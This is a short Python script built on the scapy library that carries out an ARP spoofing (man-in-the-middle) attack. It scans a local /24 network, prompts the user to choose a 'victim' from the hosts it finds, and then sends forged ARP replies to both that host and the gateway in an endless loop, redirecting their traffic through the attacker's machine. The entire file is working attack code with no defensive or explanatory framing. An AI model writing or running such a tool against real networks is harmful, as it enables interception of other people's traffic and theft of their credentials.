import scapy.all as scapy
import random
import socket
import time

#find all other devices on the network and generate a list of their IPs
#pick an IP address at random from that list
#send packets to FF:FF:FF:FF:FF:FF (global transmission) to update the ARP tables of each machine in the network

ipList=[]
macList=[]

def scan_network(ips):
    arp = scapy.ARP(pdst = ips)
    ether = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
    broadcast = ether/arp
    ans, unans = scapy.srp(broadcast, timeout = 5, verbose = False)
    for x in ans:
        #print(x[1].psrc + " " + x[1].hwsrc)
        ipList.append(x[1].psrc)
        macList.append(x[1].hwsrc)

def getMAC(targetip):
    packet = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")/scapy.ARP(op=1, pdst = targetip)
    targetmac = scapy.srp(packet, timeout=2, verbose = False)[0][0][1].hwsrc
    return targetmac

def spoofarp(targetip, targetmac, sourceip):
    spoof = scapy.ARP(op=2, pdst = targetip, psrc = sourceip, hwdst = targetmac)
    scapy.send(spoof, verbose=False)

def Main():
    print("[+] Enter Gateway IP: ")
    gatewayIP = input()
    print("[-] Scanning network for victims...")
    gatewayMAC = getMAC(gatewayIP)
    networkToScan = gatewayIP + "/24"
    scan_network(networkToScan)
    print("[+] Enter the number representing the index of the IP you wish to spoof")
    print(ipList)
    while True:
        temp = int(input())
        if(temp < 0 or temp > len(ipList)-1):
            print("[!] Invalid index")
        
        else:
            targetIP = ipList[temp]
            targetMAC = macList[temp]
            print("[-] Target IP is "+targetIP)
            print("[-] Target MAC is "+targetMAC)
            break
    
    print("[-] Spoofing...")
    while True:
        spoofarp(targetIP, targetMAC, gatewayIP)
        spoofarp(gatewayIP, gatewayMAC, targetIP)
        time.sleep(1)

if __name__ == '__main__':
    Main()
